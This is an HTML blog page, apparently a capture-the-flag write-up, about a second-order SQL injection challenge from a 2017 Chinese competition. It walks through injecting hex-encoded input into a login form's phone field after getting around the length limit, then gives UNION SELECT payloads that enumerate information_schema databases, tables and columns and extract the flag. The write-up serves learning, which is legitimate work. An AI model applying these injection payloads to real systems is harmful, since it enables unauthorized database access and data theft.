@@ -1,0 +1,131 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>i春秋web之4 | Hexo</title>
+
+  
+  <meta name="author" content="John Doe">
+  
+
+  
+  <meta name="description" content="这大概是我第一篇真正的_writeup_吧，以前的没一点技术含量，只能说完全是水字数，这篇我觉得还是有丶东西的。**本来是这么想的，写着写着感觉还是水的一匹，那这次姑且就是水的第四篇_writeup_吧。**在开始之前先谈谈_SQL_注入吧，看看曾经的_OWASP TOP10_，_SQL_注入漏洞占">
+  
+
+  
+  
+  <meta name="keywords" content="">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="i春秋web之4"/>
+
+  <meta property="og:site_name" content="Hexo"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Hexo</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>i春秋web之4</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2018/06/29/ichunqiu-web4/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-06-29T05:18:52.000Z">
+          2018-06-29
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="这大概是我第一篇真正的-writeup-吧，以前的没一点技术含量，只能说完全是水字数，这篇我觉得还是有丶东西的。-本来是这么想的，写着写着感觉还是水的一匹，那这次姑且就是水的第四篇-writeup-吧。"><a href="#这大概是我第一篇真正的-writeup-吧，以前的没一点技术含量，只能说完全是水字数，这篇我觉得还是有丶东西的。-本来是这么想的，写着写着感觉还是水的一匹，那这次姑且就是水的第四篇-writeup-吧。" class="headerlink" title="这大概是我第一篇真正的_writeup_吧，以前的没一点技术含量，只能说完全是水字数，这篇我觉得还是有丶东西的。**本来是这么想的，写着写着感觉还是水的一匹，那这次姑且就是水的第四篇_writeup_吧。**"></a><strong>这大概是我第一篇真正的_writeup_吧，以前的没一点技术含量，只能说完全是水字数，这篇我觉得还是有丶东西的。**</strong>本来是这么想的，写着写着感觉还是水的一匹，那这次姑且就是水的第四篇_writeup_吧。**</h2><h2 id="在开始之前先谈谈-SQL-注入吧，看看曾经的-OWASP-TOP10-，-SQL-注入漏洞占据高位不知道有多久，实际上直至今日也有很多站点存在-SQL-注入漏洞，为了应对-SQL-注入攻击，网站管理员为网站架设-WAF-，对源码进行改进，但仍会有些没有注意到的细节有可能会被利用，比如说登录框的-POST-注入，二次注入等等，而下面便是对2017年强网杯线上赛一道二次注入-web-题的-writeup-。"><a href="#在开始之前先谈谈-SQL-注入吧，看看曾经的-OWASP-TOP10-，-SQL-注入漏洞占据高位不知道有多久，实际上直至今日也有很多站点存在-SQL-注入漏洞，为了应对-SQL-注入攻击，网站管理员为网站架设-WAF-，对源码进行改进，但仍会有些没有注意到的细节有可能会被利用，比如说登录框的-POST-注入，二次注入等等，而下面便是对2017年强网杯线上赛一道二次注入-web-题的-writeup-。" class="headerlink" title="在开始之前先谈谈_SQL_注入吧，看看曾经的_OWASP TOP10_，_SQL_注入漏洞占据高位不知道有多久，实际上直至今日也有很多站点存在_SQL_注入漏洞，为了应对_SQL_注入攻击，网站管理员为网站架设_WAF_，对源码进行改进，但仍会有些没有注意到的细节有可能会被利用，比如说登录框的_POST_注入，二次注入等等，而下面便是对2017年强网杯线上赛一道二次注入_web_题的_writeup_。"></a><strong>在开始之前先谈谈_SQL_注入吧，看看曾经的_OWASP TOP10_，_SQL_注入漏洞占据高位不知道有多久，实际上直至今日也有很多站点存在_SQL_注入漏洞，为了应对_SQL_注入攻击，网站管理员为网站架设_WAF_，对源码进行改进，但仍会有些没有注意到的细节有可能会被利用，比如说登录框的_POST_注入，二次注入等等，而下面便是对2017年强网杯线上赛一道二次注入_web_题的_writeup_。</strong></h2><h2 id="1、-目标"><a href="#1、-目标" class="headerlink" title="_1、_目标"></a>_1、_目标</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://www.highker.wiki/wp-content/uploads/2018/06/000.png" alt=""></h2><h2 id="2、-进去之后，有一个登陆窗口，看了源码，没啥想要的，后来经过试验，发现能在手机号输入框里传入十六进制码，以此完成-SQL-注入，注意form表单这里有一处长度限制，记得要审查元素修改"><a href="#2、-进去之后，有一个登陆窗口，看了源码，没啥想要的，后来经过试验，发现能在手机号输入框里传入十六进制码，以此完成-SQL-注入，注意form表单这里有一处长度限制，记得要审查元素修改" class="headerlink" title="_2、_进去之后，有一个登陆窗口，看了源码，没啥想要的，后来经过试验，发现能在手机号输入框里传入十六进制码，以此完成_SQL_注入，注意form表单这里有一处长度限制，记得要审查元素修改"></a>_2、_进去之后，有一个登陆窗口，看了源码，没啥想要的，后来经过试验，发现能在手机号输入框里传入十六进制码，以此完成_SQL_注入，注意form表单这里有一处长度限制，记得要审查元素修改</h2><h2 id="3、-多余的图也就不放了，直接上-payload"><a href="#3、-多余的图也就不放了，直接上-payload" class="headerlink" title="3、_多余的图也就不放了，直接上_payload"></a><em>3、_多余的图也就不放了，直接上_payload</em></h2><h2 id="4、查databases-，构造“1-union-select-schema-name-from-information-schema-schemata”，得到-database-name-：-webdb"><a href="#4、查databases-，构造“1-union-select-schema-name-from-information-schema-schemata”，得到-database-name-：-webdb" class="headerlink" title="4、查databases_，构造“1 union select schema_name from information_schema.schemata”，得到_database name_：_webdb"></a><em>4、<em>查</em>databases_，构造</em>“1 union select schema_name from information_schema.schemata”<em>，得到_database name_：_webdb</em></h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://www.highker.wiki/wp-content/uploads/2018/06/002.png" alt=""></h2><h2 id="5、查tables-，构造“1-union-select-table-name-from-information-schema-tables-where-table-schema-0x7765626462”，得到-table-name-：-user"><a href="#5、查tables-，构造“1-union-select-table-name-from-information-schema-tables-where-table-schema-0x7765626462”，得到-table-name-：-user" class="headerlink" title="5、查tables_，构造“1 union select table_name from information_schema.tables where table_schema=0x7765626462”，得到_table name_：_user"></a><em>5、<em>查</em>tables_，构造</em>“1 union select table_name from information_schema.tables where table_schema=0x7765626462”<em>，得到_table name_：_user</em></h2><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://www.highker.wiki/wp-content/uploads/2018/06/003.png" alt=""></h2><h2 id="6、查columns-，构造“1-union-select-column-name-from-information-schema-columns-where-table-name-0x75736572”，得到-columns-：他喵的一大堆，当时试了他麻痹的好几个，最后看到最下边有个-phone-才想到题目就叫-phone-number-，-flag-绝逼在这里边，遂查询字段内容，构造“1-union-select-phone-from-user”"><a href="#6、查columns-，构造“1-union-select-column-name-from-information-schema-columns-where-table-name-0x75736572”，得到-columns-：他喵的一大堆，当时试了他麻痹的好几个，最后看到最下边有个-phone-才想到题目就叫-phone-number-，-flag-绝逼在这里边，遂查询字段内容，构造“1-union-select-phone-from-user”" class="headerlink" title="6、查columns_，构造“1 union select column_name from information_schema.columns where table_name=0x75736572”，得到_columns_：他喵的一大堆，当时试了他麻痹的好几个，最后看到最下边有个_phone_才想到题目就叫_phone number_，_flag_绝逼在这里边，遂查询字段内容，构造“1 union select phone from user”_"></a><em>6、<em>查</em>columns_，构造</em>“1 union select column_name from information_schema.columns where table_name=0x75736572”<em>，得到_columns_：他喵的一大堆，当时试了他麻痹的好几个，最后看到最下边有个_phone_才想到题目就叫_phone number_，_flag_绝逼在这里边，遂查询字段内容，构造</em>“1 union select phone from user”_</h2><h2 id="-3"><a href="#-3" class="headerlink" title=""></a><img src="https://www.highker.wiki/wp-content/uploads/2018/06/004.png" alt=""></h2><h2 id="7、get-flag"><a href="#7、get-flag" class="headerlink" title="7、get flag"></a><em>7、get flag</em></h2><h2 id="-4"><a href="#-4" class="headerlink" title=""></a><img src="https://www.highker.wiki/wp-content/uploads/2018/06/005.png" alt=""></h2>
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/web/">web</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2019 John Doe
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+</body>
+</html>
